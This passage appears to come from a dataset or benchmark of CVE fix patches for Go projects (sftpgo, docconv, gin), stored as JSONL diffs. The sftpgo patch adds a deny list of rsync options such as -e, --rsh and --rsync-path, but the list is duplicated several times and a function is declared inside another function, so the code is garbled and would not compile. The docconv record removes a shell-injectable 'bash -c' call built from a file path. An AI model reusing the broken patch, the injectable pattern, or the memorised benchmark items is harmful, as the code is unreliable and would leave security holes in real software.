!strings.HasSuffix(fsPath, string(os.PathSeparator)) {\n-\t\t\tfsPath += string(os.PathSeparator)\n-\t\t\tc.connection.Log(logger.LevelDebug, \"path separator added to fsPath %q\", fsPath)\n-\t\t}\n-\t\targs = args[:len(args)-1]\n-\t\targs = append(args, fsPath)\n-\t}\n-\tif err := c.isSystemCommandAllowed(); err != nil {\n-\t\treturn command, errUnsupportedConfig\n-\t}\n-\tif c.command == \"rsync\" {\n-\t\t// we cannot avoid that rsync creates symlinks so if the user has the permission\n-\t\t// to create symlinks we add the option --safe-links to the received rsync command if\n-\t\t// it is not already set. This should prevent to create symlinks that point outside\n-\t\t// the home dir.\n-\t\t// If the user cannot create symlinks we add the option --munge-links, if it is not\n-\t\t// already set. This should make symlinks unusable (but manually recoverable)\n-\t\tif c.connection.User.HasPerm(dataprovider.PermCreateSymlinks, c.getDestPath()) {\n-\t\t\tif !util.Contains(args, \"--safe-links\") {\n-\t\t\t\targs = append([]string{\"--safe-links\"}, args...)\n-\t\t\t}\n-\t\t} else {\n-\t\t\tif !util.Contains(args, \"--munge-links\") {\n-\t\t\t\targs = append([]string{\"--munge-links\"}, args...)\n-\t\t\t}\n-\t\t}\n-\t}\n-\tc.connection.Log(logger.LevelDebug, \"new system command %q, with args: %+v fs path %q quota check path %q\",\n-\t\tc.command, args, fsPath, quotaPath)\n-\tcmd := exec.Command(c.command, args...)\n-\tuid := c.connection.User.GetUID()\n-\tgid := c.connection.User.GetGID()\n-\tcmd = wrapCmd(cmd, uid, gid)\n-\tcommand.cmd = cmd\n-\tcommand.fsPath = fsPath\n-\tcommand.quotaCheckPath = quotaPath\n-\tcommand.fs = fs\n-\treturn command, nil\n+        command := systemCommand{\n+                cmd:            nil,\n+                fs:             nil,\n+                fsPath:         \"\",\n+                quotaCheckPath: \"\",\n+        }\n+        if err := common.CheckClosing(); err != nil {\n+                return command, err\n+        }\n+        args := make([]string, len(c.args))\n+        copy(args, c.args)\n+        var fsPath, quotaPath string\n+        sshPath := c.getDestPath()\n+        fs, err := c.connection.User.GetFilesystemForPath(sshPath, c.connection.ID)\n+        if err != nil {\n+                return command, err\n+        }\n+        if len(c.args) > 0 {\n+                var err error\n+                fsPath, err = fs.ResolvePath(sshPath)\n+                if err != nil {\n+                        return command, c.connection.GetFsError(fs, err)\n+                }\n+                quotaPath = sshPath\n+                fi, err := fs.Stat(fsPath)\n+                if err == nil && fi.IsDir() {\n+                        // if the target is an existing dir the command will write inside this dir\n+                        // so we need to check the quota for this directory and not its parent dir\n+                        quotaPath = path.Join(sshPath, \"fakecontent\")\n+                }\n+                if strings.HasSuffix(sshPath, \"/\") && !strings.HasSuffix(fsPath, string(os.PathSeparator)) {\n+                        fsPath += string(os.PathSeparator)\n+                        c.connection.Log(logger.LevelDebug, \"path separator added to fsPath %q\", fsPath)\n+                }\n+                args = args[:len(args)-1]\n+                args = append(args, fsPath)\n+// Security: sanitize rsync options\n+// We forbid some options that can be used to read/write files outside the user's home directory\n+// or to execute arbitrary commands.\n+                        // Security: sanitize rsync options\n+                        // We forbid some options that can be used to read/write files outside the user's home directory\n+                        // or to execute arbitrary commands.\n+                        forbiddenOptions := []string{\n+                                \"-e\", \"--rsh\", \"--rsync-path\", \"--log-file\", \"--backup-dir\", \"--daemon\",\n+                                \"--compare-dest\", \"--copy-dest\", \"--link-dest\", \"--files-from\",\n+                                \"--include-from\", \"--exclude-from\",\n+                        }\n+\n+                        for _, arg := range args {\n+                                for _, forbidden := range forbiddenOptions {\n+                                        if arg == forbidden {\n+                                                return command, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+                                        }\n+                                        if strings.HasPrefix(arg, forbidden+\"=\") {\n+                                                return command, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+                                        }\n+                                }\n+                        }\n+forbiddenOptions := []string{\n+\"-e\", \"--rsh\", \"--rsync-path\", \"--log-file\", \"--backup-dir\", \"--daemon\",\n+\"--compare-dest\", \"--copy-dest\", \"--link-dest\", \"--files-from\",\n+\"--include-from\", \"--exclude-from\",\n+}\n+\n+for _, arg := range args {\n+for _, forbidden := range forbiddenOptions {\n+if arg == forbidden {\n+return command, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+}\n+if strings.HasPrefix(arg, forbidden+\"=\") {\n+return command, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+}\n+}\n+}\n+        }\n+        if err := c.isSystemCommandAllowed(); err != nil {\n+                return command, errUnsupportedConfig\n+        }\n+        if c.command == \"rsync\" {\n+// Security: sanitize rsync options\n+// We forbid some options that can be used to read/write files outside the user's home directory\n+// or to execute arbitrary commands.\n+forbiddenOptions := []string{\n+\"-e\", \"--rsh\", \"--rsync-path\", \"--log-file\", \"--backup-dir\", \"--daemon\",\n+\"--compare-dest\", \"--copy-dest\", \"--link-dest\", \"--files-from\",\n+\"--include-from\", \"--exclude-from\",\n+}\n+\n+for _, arg := range args {\n+for _, forbidden := range forbiddenOptions {\n+if arg == forbidden {\n+return command, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+}\n+if strings.HasPrefix(arg, forbidden+\"=\") {\n+return command, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+}\n+}\n+}\n+                // we cannot avoid that rsync creates symlinks so if the user has the permission\n+                // to create symlinks we add the option --safe-links to the received rsync command if\n+                // it is not already set. This should prevent to create symlinks that point outside\n+                // the home dir.\n+\n+func sanitizeRsyncCommand(args []string, c *sshCommand) ([]string, error) {\n+// Security: sanitize rsync options\n+// We forbid some options that can be used to read/write files outside the user's home directory\n+// or to execute arbitrary commands.\n+forbiddenOptions := []string{\n+\"-e\", \"--rsh\", \"--rsync-path\", \"--log-file\", \"--backup-dir\", \"--daemon\",\n+\"--compare-dest\", \"--copy-dest\", \"--link-dest\", \"--files-from\",\n+\"--include-from\", \"--exclude-from\",\n+}\n+\n+for _, arg := range args {\n+for _, forbidden := range forbiddenOptions {\n+if arg == forbidden {\n+return nil, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+}\n+if strings.HasPrefix(arg, forbidden+\"=\") {\n+return nil, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+}\n+}\n+}\n+// we cannot avoid that rsync creates symlinks so if the user has the permission\n+// to create symlinks we add the option --safe-links to the received rsync command if\n+// it is not already set. This should prevent to create symlinks that point outside\n+// the home dir.\n+// If the user cannot create symlinks we add the option --munge-links, if it is not\n+// already set. This should make symlinks unusable (but manually recoverable)\n+if c.connection.User.HasPerm(dataprovider.PermCreateSymlinks, c.getDestPath()) {\n+if !util.Contains(args, \"--safe-links\") {\n+args = append([]string{\"--safe-links\"}, args...)\n+}\n+} else {\n+if !util.Contains(args, \"--munge-links\") {\n+args = append([]string{\"--munge-links\"}, args...)\n+}\n+}\n+return args, nil\n+}\n+\n+                // If the user cannot create symlinks we add the option --munge-links, if it is not\n+                // already set. This should make symlinks unusable (but manually recoverable)\n+                if c.connection.User.HasPerm(dataprovider.PermCreateSymlinks, c.getDestPath()) {\n+                        if !util.Contains(args, \"--safe-links\") {\n+                                args = append([]string{\"--safe-links\"}, args...)\n+                        }\n+                } else {\n+                        if !util.Contains(args, \"--munge-links\") {\n+                                args = append([]string{\"--munge-links\"}, args...)\n+                        }\n+                }\n+        }\n+\n+for _, arg := range args {\n+for _, forbidden := range forbiddenOptions {\n+if arg == forbidden {\n+return command, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+}\n+if strings.HasPrefix(arg, forbidden+\"=\") {\n+return command, fmt.Errorf(\"unsupported rsync option: %q\", arg)\n+}\n+}\n+}\n+\n+        c.connection.Log(logger.LevelDebug, \"new system command %q, with args: %+v fs path %q quota check path %q\",\n+                c.command, args, fsPath, quotaPath)\n+        cmd := exec.Command(c.command, args...)\n+        uid := c.connection.User.GetUID()\n+        gid := c.connection.User.GetGID()\n+        cmd = wrapCmd(cmd, uid, gid)\n+        command.cmd = cmd\n+        command.fsPath = fsPath\n+        command.quotaCheckPath = quotaPath\n+        command.fs = fs\n+        return command, nil\n }\n \n // for the supported commands, the destination path, if any, is the last argument\n func (c *sshCommand) getDestPath() string {\n-\tif len(c.args) == 0 {\n-\t\treturn \"\"\n-\t}\n-\treturn c.cleanCommandPath(c.args[len(c.args)-1])\n+        if len(c.args) == 0 {\n+                return \"\"\n+        }\n+        return c.cleanCommandPath(c.args[len(c.args)-1])\n }\n \n // for the supported commands, the destination path, if any, is the second-last argument\n func (c *sshCommand) getSourcePath() string {\n-\tif len(c.args) < 2 {\n-\t\treturn \"\"\n-\t}\n-\treturn c.cleanCommandPath(c.args[len(c.args)-2])\n+        if len(c.args) < 2 {\n+                return \"\"\n+        }\n+        return c.cleanCommandPath(c.args[len(c.args)-2])\n }\n \n func (c *sshCommand) cleanCommandPath(name string) string {\n-\tname = strings.Trim(name, \"'\")\n-\tname = strings.Trim(name, \"\\\"\")\n-\tresult := c.connection.User.GetCleanedPath(name)\n-\tif strings.HasSuffix(name, \"/\") && !strings.HasSuffix(result, \"/\") {\n-\t\tresult += \"/\"\n-\t}\n-\treturn result\n+        name = strings.Trim(name, \"'\")\n+        name = strings.Trim(name, \"\\\"\")\n+        result := c.connection.User.GetCleanedPath(name)\n+        if strings.HasSuffix(name, \"/\") && !strings.HasSuffix(result, \"/\") {\n+                result += \"/\"\n+        }\n+        return result\n }\n \n func (c *sshCommand) getRemovePath() (string, error) {\n-\tsshDestPath := c.getDestPath()\n-\tif sshDestPath == \"\" || len(c.args) != 1 {\n-\t\terr := errors.New(\"usage sftpgo-remove <destination path>\")\n-\t\treturn \"\", err\n-\t}\n-\tif len(sshDestPath) > 1 {\n-\t\tsshDestPath = strings.TrimSuffix(sshDestPath, \"/\")\n-\t}\n-\treturn sshDestPath, nil\n+        sshDestPath := c.getDestPath()\n+        if sshDestPath == \"\" || len(c.args) != 1 {\n+                err := errors.New(\"usage sftpgo-remove <destination path>\")\n+                return \"\", err\n+        }\n+        if len(sshDestPath) > 1 {\n+                sshDestPath = strings.TrimSuffix(sshDestPath, \"/\")\n+        }\n+        return sshDestPath, nil\n }\n \n func (c *sshCommand) isLocalPath(virtualPath string) bool {\n-\tfolder, err := c.connection.User.GetVirtualFolderForPath(virtualPath)\n-\tif err != nil {\n-\t\treturn c.connection.User.FsConfig.Provider == sdk.LocalFilesystemProvider\n-\t}\n-\treturn folder.FsConfig.Provider == sdk.LocalFilesystemProvider\n+        folder, err := c.connection.User.GetVirtualFolderForPath(virtualPath)\n+        if err != nil {\n+                return c.connection.User.FsConfig.Provider == sdk.LocalFilesystemProvider\n+        }\n+        return folder.FsConfig.Provider == sdk.LocalFilesystemProvider\n }\n \n func (c *sshCommand) getSizeForPath(fs vfs.Fs, name string) (int, int64, error) {\n-\tif dataprovider.GetQuotaTracking() > 0 {\n-\t\tfi, err := fs.Lstat(name)\n-\t\tif err != nil {\n-\t\t\tif fs.IsNotExist(err) {\n-\t\t\t\treturn 0, 0, nil\n-\t\t\t}\n-\t\t\tc.connection.Log(logger.LevelDebug, \"unable to stat %q error: %v\", name, err)\n-\t\t\treturn 0, 0, err\n-\t\t}\n-\t\tif fi.IsDir() {\n-\t\t\tfiles, size, err := fs.GetDirSize(name)\n-\t\t\tif err != nil {\n-\t\t\t\tc.connection.Log(logger.LevelDebug, \"unable to get size for dir %q error: %v\", name, err)\n-\t\t\t}\n-\t\t\treturn files, size, err\n-\t\t} else if fi.Mode().IsRegular() {\n-\t\t\treturn 1, fi.Size(), nil\n-\t\t}\n-\t}\n-\treturn 0, 0, nil\n+        if dataprovider.GetQuotaTracking() > 0 {\n+                fi, err := fs.Lstat(name)\n+                if err != nil {\n+                        if fs.IsNotExist(err) {\n+                                return 0, 0, nil\n+                        }\n+                        c.connection.Log(logger.LevelDebug, \"unable to stat %q error: %v\", name, err)\n+                        return 0, 0, err\n+                }\n+                if fi.IsDir() {\n+                        files, size, err := fs.GetDirSize(name)\n+                        if err != nil {\n+                                c.connection.Log(logger.LevelDebug, \"unable to get size for dir %q error: %v\", name, err)\n+                        }\n+                        return files, size, err\n+                } else if fi.Mode().IsRegular() {\n+                        return 1, fi.Size(), nil\n+                }\n+        }\n+        return 0, 0, nil\n }\n \n func (c *sshCommand) sendErrorResponse(err error) error {\n-\terrorString := fmt.Sprintf(\"%v: %v %v\\n\", c.command, c.getDestPath(), err)\n-\tc.connection.channel.Write([]byte(errorString)) //nolint:errcheck\n-\tc.sendExitStatus(err)\n-\treturn err\n+        errorString := fmt.Sprintf(\"%v: %v %v\\n\", c.command, c.getDestPath(), err)\n+        c.connection.channel.Write([]byte(errorString)) //nolint:errcheck\n+        c.sendExitStatus(err)\n+        return err\n }\n \n func (c *sshCommand) sendExitStatus(err error) {\n-\tstatus := uint32(0)\n-\tvCmdPath := c.getDestPath()\n-\tcmdPath := \"\"\n-\ttargetPath := \"\"\n-\tvTargetPath := \"\"\n-\tif c.command == \"sftpgo-copy\" {\n-\t\tvTargetPath = vCmdPath\n-\t\tvCmdPath = c.getSourcePath()\n-\t}\n-\tif err != nil {\n-\t\tstatus = uint32(1)\n-\t\tc.connection.Log(logger.LevelError, \"command failed: %q args: %v user: %s err: %v\",\n-\t\t\tc.command, c.args, c.connection.User.Username, err)\n-\t}\n-\texitStatus := sshSubsystemExitStatus{\n-\t\tStatus: status,\n-\t}\n-\t_, errClose := c.connection.channel.(ssh.Channel).SendRequest(\"exit-status\", false, ssh.Marshal(&exitStatus))\n-\tc.connection.Log(logger.LevelDebug, \"exit status sent, error: %v\", errClose)\n-\tc.connection.channel.Close()\n-\t// for scp we notify single uploads/downloads\n-\tif c.command != scpCmdName {\n-\t\telapsed := time.Since(c.startTime).Nanoseconds() / 1000000\n-\t\tmetric.SSHCommandCompleted(err)\n-\t\tif vCmdPath != \"\" {\n-\t\t\t_, p, errFs := c.connection.GetFsAndResolvedPath(vCmdPath)\n-\t\t\tif errFs == nil {\n-\t\t\t\tcmdPath = p\n-\t\t\t}\n-\t\t}\n-\t\tif vTargetPath != \"\" {\n-\t\t\t_, p, errFs := c.connection.GetFsAndResolvedPath(vTargetPath)\n-\t\t\tif errFs == nil {\n-\t\t\t\ttargetPath = p\n-\t\t\t}\n-\t\t}\n-\t\tcommon.ExecuteActionNotification(c.connection.BaseConnection, common.OperationSSHCmd, cmdPath, vCmdPath, //nolint:errcheck\n-\t\t\ttargetPath, vTargetPath, c.command, 0, err, elapsed, nil)\n-\t\tif err == nil {\n-\t\t\tlogger.CommandLog(sshCommandLogSender, cmdPath, targetPath, c.connection.User.Username, \"\", c.connection.ID,\n-\t\t\t\tcommon.ProtocolSSH, -1, -1, \"\", \"\", c.connection.command, -1, c.connection.GetLocalAddress(),\n-\t\t\t\tc.connection.GetRemoteAddress(), elapsed)\n-\t\t}\n-\t}\n+        status := uint32(0)\n+        vCmdPath := c.getDestPath()\n+        cmdPath := \"\"\n+        targetPath := \"\"\n+        vTargetPath := \"\"\n+        if c.command == \"sftpgo-copy\" {\n+                vTargetPath = vCmdPath\n+                vCmdPath = c.getSourcePath()\n+        }\n+        if err != nil {\n+                status = uint32(1)\n+                c.connection.Log(logger.LevelError, \"command failed: %q args: %v user: %s err: %v\",\n+                        c.command, c.args, c.connection.User.Username, err)\n+        }\n+        exitStatus := sshSubsystemExitStatus{\n+                Status: status,\n+        }\n+        _, errClose := c.connection.channel.(ssh.Channel).SendRequest(\"exit-status\", false, ssh.Marshal(&exitStatus))\n+        c.connection.Log(logger.LevelDebug, \"exit status sent, error: %v\", errClose)\n+        c.connection.channel.Close()\n+        // for scp we notify single uploads/downloads\n+        if c.command != scpCmdName {\n+                elapsed := time.Since(c.startTime).Nanoseconds() / 1000000\n+                metric.SSHCommandCompleted(err)\n+                if vCmdPath != \"\" {\n+                        _, p, errFs := c.connection.GetFsAndResolvedPath(vCmdPath)\n+                        if errFs == nil {\n+                                cmdPath = p\n+                        }\n+                }\n+                if vTargetPath != \"\" {\n+                        _, p, errFs := c.connection.GetFsAndResolvedPath(vTargetPath)\n+                        if errFs == nil {\n+                                targetPath = p\n+                        }\n+                }\n+                common.ExecuteActionNotification(c.connection.BaseConnection, common.OperationSSHCmd, cmdPath, vCmdPath, //nolint:errcheck\n+                        targetPath, vTargetPath, c.command, 0, err, elapsed, nil)\n+                if err == nil {\n+                        logger.CommandLog(sshCommandLogSender, cmdPath, targetPath, c.connection.User.Username, \"\", c.connection.ID,\n+                                common.ProtocolSSH, -1, -1, \"\", \"\", c.connection.command, -1, c.connection.GetLocalAddress(),\n+                                c.connection.GetRemoteAddress(), elapsed)\n+                }\n+        }\n }\n \n func (c *sshCommand) computeHashForFile(fs vfs.Fs, hasher hash.Hash, path string) (string, error) {\n-\thash := \"\"\n-\tf, r, _, err := fs.Open(path, 0)\n-\tif err != nil {\n-\t\treturn hash, err\n-\t}\n-\tvar reader io.ReadCloser\n-\tif f != nil {\n-\t\treader = f\n-\t} else {\n-\t\treader = r\n-\t}\n-\tdefer reader.Close()\n-\t_, err = io.Copy(hasher, reader)\n-\tif err == nil {\n-\t\thash = fmt.Sprintf(\"%x\", hasher.Sum(nil))\n-\t}\n-\treturn hash, err\n+        hash := \"\"\n+        f, r, _, err := fs.Open(path, 0)\n+        if err != nil {\n+                return hash, err\n+        }\n+        var reader io.ReadCloser\n+        if f != nil {\n+                reader = f\n+        } else {\n+                reader = r\n+        }\n+        defer reader.Close()\n+        _, err = io.Copy(hasher, reader)\n+        if err == nil {\n+                hash = fmt.Sprintf(\"%x\", hasher.Sum(nil))\n+        }\n+        return hash, err\n }\n \n func parseCommandPayload(command string) (string, []string, error) {\n-\tparts, err := shlex.Split(command)\n-\tif err == nil && len(parts) == 0 {\n-\t\terr = fmt.Errorf(\"invalid command: %q\", command)\n-\t}\n-\tif err != nil {\n-\t\treturn \"\", []string{}, err\n-\t}\n-\tif len(parts) < 2 {\n-\t\treturn parts[0], []string{}, nil\n-\t}\n-\treturn parts[0], parts[1:], nil\n+        parts, err := shlex.Split(command)\n+        if err == nil && len(parts) == 0 {\n+                err = fmt.Errorf(\"invalid command: %q\", command)\n+        }\n+        if err != nil {\n+                return \"\", []string{}, err\n+        }\n+        if len(parts) < 2 {\n+                return parts[0], []string{}, nil\n+        }\n+        return parts[0], parts[1:], nil\n }\n"}
{"cve":"CVE-2022-4643:0708", "fix_patch": "diff --git a/pdf_ocr.go b/pdf_ocr.go\nindex 4d9d53a..a0a9dd6 100644\n--- a/pdf_ocr.go\n+++ b/pdf_ocr.go\n@@ -3,159 +3,165 @@\n package docconv\n \n import (\n-\t\"fmt\"\n-\t\"io\"\n-\t\"io/ioutil\"\n-\t\"log\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path/filepath\"\n-\t\"strings\"\n-\t\"sync\"\n+\"fmt\"\n+\"io\"\n+\"io/ioutil\"\n+\"log\"\n+\"os\"\n+\"os/exec\"\n+\"path/filepath\"\n+\"strings\"\n+\"sync\"\n )\n \n var (\n-\texts = []string{\".jpg\", \".tif\", \".tiff\", \".png\", \".pbm\"}\n+exts = []string{\".jpg\", \".tif\", \".tiff\", \".png\", \".pbm\"}\n )\n \n func compareExt(ext string, exts []string) bool {\n-\tfor _, e := range exts {\n-\t\tif ext == e {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+for _, e := range exts {\n+if ext == e {\n+return true\n+}\n+}\n+return false\n }\n \n func cleanupTemp(tmpDir string) {\n-\terr := os.RemoveAll(tmpDir)\n-\tif err != nil {\n-\t\tlog.Println(err)\n-\t}\n+err := os.RemoveAll(tmpDir)\n+if err != nil {\n+log.Println(err)\n+}\n }\n \n func ConvertPDFImages(path string) (BodyResult, error) {\n-\tbodyResult := BodyResult{}\n+bodyResult := BodyResult{}\n \n-\ttmp, err := ioutil.TempDir(os.TempDir(), \"tmp-imgs-\")\n-\tif err != nil {\n-\t\tbodyResult.err = err\n-\t\treturn bodyResult, err\n-\t}\n-\ttmpDir := fmt.Sprintf(\"%s/\", tmp)\n+tmp, err := ioutil.TempDir(os.TempDir(), \"tmp-imgs-\")\n+if err != nil {\n+bodyResult.err = err\n+return bodyResult, err\n+}\n+tmpDir := fmt.Sprintf(\"%s/\", tmp)\n \n-\tdefer cleanupTemp(tmpDir)\n+defer cleanupTemp(tmpDir)\n \n-\t_, err = exec.Command(\"pdfimages\", \"-j\", path, tmpDir).Output()\n-\tif err != nil {\n-\t\treturn bodyResult, err\n-\t}\n+_, err = exec.Command(\"pdfimages\", \"-j\", path, tmpDir).Output()\n+if err != nil {\n+return bodyResult, err\n+}\n \n-\tfilePaths := []string{}\n+filePaths := []string{}\n \n-\twalkFunc := func(path string, info os.FileInfo, err error) error {\n-\t\tpath, err = filepath.Abs(path)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n+walkFunc := func(path string, info os.FileInfo, err error) error {\n+path, err = filepath.Abs(path)\n+if err != nil {\n+return err\n+}\n \n-\t\tif compareExt(filepath.Ext(path), exts) {\n-\t\t\tfilePaths = append(filePaths, path)\n-\t\t}\n-\t\treturn nil\n-\t}\n-\tfilepath.Walk(tmpDir, walkFunc)\n+if compareExt(filepath.Ext(path), exts) {\n+filePaths = append(filePaths, path)\n+}\n+return nil\n+}\n+filepath.Walk(tmpDir, walkFunc)\n \n-\tfileLength := len(filePaths)\n+fileLength := len(filePaths)\n \n-\tif fileLength < 1 {\n-\t\treturn bodyResult, nil\n-\t}\n+if fileLength < 1 {\n+return bodyResult, nil\n+}\n \n-\tvar wg sync.WaitGroup\n+var wg sync.WaitGroup\n \n-\tdata := make(chan string, fileLength)\n+data := make(chan string, fileLength)\n \n-\twg.Add(fileLength)\n+wg.Add(fileLength)\n \n-\tfor _, p := range filePaths {\n-\t\tgo func(pathFile string) {\n-\t\t\tdefer wg.Done()\n-\t\t\tf, err := os.Open(pathFile)\n-\t\t\tif err != nil {\n-\t\t\t\treturn\n-\t\t\t}\n+for _, p := range filePaths {\n+go func(pathFile string) {\n+defer wg.Done()\n+f, err := os.Open(pathFile)\n+if err != nil {\n+return\n+}\n \n-\t\t\tdefer f.Close()\n-\t\t\tout, _, err := ConvertImage(f)\n-\t\t\tif err != nil {\n-\t\t\t\treturn\n-\t\t\t}\n+defer f.Close()\n+out, _, err := ConvertImage(f)\n+if err != nil {\n+return\n+}\n \n-\t\t\tdata <- out\n+data <- out\n \n-\t\t}(p)\n-\t}\n+}(p)\n+}\n \n-\twg.Wait()\n+wg.Wait()\n \n-\tclose(data)\n+close(data)\n \n-\tfor str := range data {\n-\t\tbodyResult.body += str + \" \"\n-\t}\n+for str := range data {\n+bodyResult.body += str + \" \"\n+}\n \n-\treturn bodyResult, nil\n+return bodyResult, nil\n }\n \n // PdfHasImage verify if `path` (PDF) has images\n func PDFHasImage(path string) bool {\n-\tcmd := \"pdffonts -l 5 %s | tail -n +3 | cut -d' ' -f1 | sort | uniq\"\n-\tout, err := exec.Command(\"bash\", \"-c\", fmt.Sprintf(cmd, path)).Output()\n-\tif err != nil {\n-\t\tlog.Println(err)\n-\t\treturn false\n-\t}\n-\tif string(out) == \"\" {\n-\t\treturn true\n-\t}\n-\treturn false\n+out, err := exec.Command(\"pdffonts\", \"-l\", \"5\", path).Output()\n+if err != nil {\n+log.Println(err)\n+return false\n+}\n+// The output of pdffonts has a 2-line header.\n+// If there are fonts, the output will have more than 2 lines.\n+// A blank line at the end is common.\n+lines := strings.Split(string(out), \"\\n\")\n+var fontLines int\n+for _, line := range lines[2:] {\n+if len(strings.TrimSpace(line)) > 0 {\n+fontLines++\n+}\n+}\n+return fontLines == 0\n }\n \n func ConvertPDF(r io.Reader) (string, map[string]string, error) {\n-\tf, err := NewLocalFile(r)\n-\tif err != nil {\n-\t\treturn \"\", nil, fmt.Errorf(\"error creating local file: %v\", err)\n-\t}\n-\tdefer f.Done()\n-\n-\tbodyResult, metaResult, textConvertErr := ConvertPDFText(f.Name())\n-\tif textConvertErr != nil {\n-\t\treturn \"\", nil, textConvertErr\n-\t}\n-\tif bodyResult.err != nil {\n-\t\treturn \"\", nil, bodyResult.err\n-\t}\n-\tif metaResult.err != nil {\n-\t\treturn \"\", nil, metaResult.err\n-\t}\n-\n-\tif !PDFHasImage(f.Name()) {\n-\t\treturn bodyResult.body, metaResult.meta, nil\n-\t}\n-\n-\timageConvertResult, imageConvertErr := ConvertPDFImages(f.Name())\n-\tif imageConvertErr != nil {\n-\t\tlog.Println(imageConvertErr)\n-\t\treturn bodyResult.body, metaResult.meta, nil\n-\t}\n-\tif imageConvertResult.err != nil {\n-\t\tlog.Println(imageConvertResult.err)\n-\t\treturn bodyResult.body, metaResult.meta, nil\n-\t}\n-\n-\tfullBody := strings.Join([]string{bodyResult.body, imageConvertResult.body}, \" \")\n-\n-\treturn fullBody, metaResult.meta, nil\n+f, err := NewLocalFile(r)\n+if err != nil {\n+return \"\", nil, fmt.Errorf(\"error creating local file: %v\", err)\n+}\n+defer f.Done()\n+\n+bodyResult, metaResult, textConvertErr := ConvertPDFText(f.Name())\n+if textConvertErr != nil {\n+return \"\", nil, textConvertErr\n+}\n+if bodyResult.err != nil {\n+return \"\", nil, bodyResult.err\n+}\n+if metaResult.err != nil {\n+return \"\", nil, metaResult.err\n+}\n+\n+if !PDFHasImage(f.Name()) {\n+return bodyResult.body, metaResult.meta, nil\n+}\n+\n+imageConvertResult, imageConvertErr := ConvertPDFImages(f.Name())\n+if imageConvertErr != nil {\n+log.Println(imageConvertErr)\n+return bodyResult.body, metaResult.meta, nil\n+}\n+if imageConvertResult.err != nil {\n+log.Println(imageConvertResult.err)\n+return bodyResult.body, metaResult.meta, nil\n+}\n+\n+fullBody := strings.Join([]string{bodyResult.body, imageConvertResult.body}, \" \")\n+\n+return fullBody, metaResult.meta, nil\n \n }\n"}
{"cve":"CVE-2023-26125:0708", "fix_patch": "diff --git a/gin.go b/gin.go\nindex 32dae24..81bcb17 100644\n--- a/gin.go\n+++ b/gin.go\n@@ -5,40 +5,40 @@\n package gin\n \n import (\n-\t\"fmt\"\n-\t\"html/template\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"os\"\n-\t\"path\"\n-\t\"strings\"\n-\t\"sync\"\n-\n-\t\"github.com/gin-gonic/gin/internal/bytesconv\"\n-\t\"github.com/gin-gonic/gin/render\"\n-\t\"golang.org/x/net/http2\"\n-\t\"golang.org/x/net/http2/h2c\"\n+        \"fmt\"\n+        \"html/template\"\n+        \"net\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"os\"\n+        \"path\"\n+        \"strings\"\n+        \"sync\"\n+\n+        \"github.com/gin-gonic/gin/internal/bytesconv\"\n+        \"github.com/gin-gonic/gin/render\"\n+        \"golang.org/x/net/http2\"\n+        \"golang.org/x/net/http2/h2c\"\n )\n \n const defaultMultipartMemory = 32 << 20 // 32 MB\n \n var (\n-\tdefault404Body = []byte(\"404 page not found\")\n-\tdefault405Body = []byte(\"405 method not allowed\")\n+        default404Body = []byte(\"404 page not found\")\n+        default405Body = []byte(\"405 method not allowed\")\n )\n \n var defaultPlatform string\n \n var defaultTrustedCIDRs = []*net.IPNet{\n-\t{ // 0.0.0.0/0 (IPv4)\n-\t\tIP:   net.IP{0x0, 0x0, 0x0, 0x0},\n-\t\tMask: net.IPMask{0x0, 0x0, 0x0, 0x0},\n-\t},\n-\t{ // ::/0 (IPv6)\n-\t\tIP:   net.IP{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},\n-\t\tMask: net.IPMask{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},\n-\t},\n+        { // 0.0.0.0/0 (IPv4)\n+                IP:   net.IP{0x0, 0x0, 0x0, 0x0},\n+                Mask: net.IPMask{0x0, 0x0, 0x0, 0x0},\n+        },\n+        { // ::/0 (IPv6)\n+                IP:   net.IP{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},\n+                Mask: net.IPMask{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},\n+        },\n }\n \n // HandlerFunc defines the handler used by gin middleware as return value.\n@@ -49,18 +49,18 @@ type HandlersChain []HandlerFunc\n \n // Last returns the last handler in the chain. i.e. the last handler is the main one.\n func (c HandlersChain) Last() HandlerFunc {\n-\tif length := len(c); length > 0 {\n-\t\treturn c[length-1]\n-\t}\n-\treturn nil\n+        if length := len(c); length > 0 {\n+                return c[length-1]\n+        }\n+        return nil\n }\n \n // RouteInfo represents a request route's specification which contains method and path and its handler.\n type RouteInfo struct {\n-\tMethod      string\n-\tPath        string\n-\tHandler     string\n-\tHandlerFunc HandlerFunc\n+        Method      string\n+        Path        string\n+        Handler     string\n+        HandlerFunc HandlerFunc\n }\n \n // RoutesInfo defines a RouteInfo slice.\n@@ -68,103 +68,103 @@ type RoutesInfo []RouteInfo\n \n // Trusted platforms\n const (\n-\t// PlatformGoogleAppEngine when running on Google App Engine. Trust X-Appengine-Remote-Addr\n-\t// for determining the client's IP\n-\tPlatformGoogleAppEngine = \"X-Appengine-Remote-Addr\"\n-\t// PlatformCloudflare when using Cloudflare's CDN. Trust CF-Connecting-IP for determining\n-\t// the client's IP\n-\tPlatformCloudflare = \"CF-Connecting-IP\"\n+        // PlatformGoogleAppEngine when running on Google App Engine. Trust X-Appengine-Remote-Addr\n+        // for determining the client's IP\n+        PlatformGoogleAppEngine = \"X-Appengine-Remote-Addr\"\n+        // PlatformCloudflare when using Cloudflare's CDN. Trust 